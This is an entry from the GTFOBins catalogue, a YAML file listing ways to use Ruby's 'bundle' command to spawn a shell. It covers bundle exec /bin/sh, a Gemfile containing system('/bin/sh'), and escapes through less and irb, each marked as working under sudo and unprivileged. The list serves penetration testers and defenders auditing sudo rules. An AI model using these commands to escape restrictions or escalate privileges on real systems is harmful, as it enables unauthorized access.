<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/bundle -->
---
functions:
  inherit:
  - code: |-
      bundle help
    contexts:
      sudo:
      unprivileged:
    from: less
  - code: |-
      touch Gemfile
      bundle console
    contexts:
      sudo:
      unprivileged:
    from: irb
  shell:
  - code: |-
      BUNDLE_GEMFILE=x bundle exec /bin/sh
    contexts:
      sudo:
      unprivileged:
  - code: |-
      touch Gemfile
      bundle exec /bin/sh
    contexts:
      sudo:
      unprivileged:
  - code: |-
      echo 'system("/bin/sh")' >Gemfile
      bundle install
    comment: |-
      This might run the shell twice, one after the other.
    contexts:
      sudo:
      unprivileged:
...
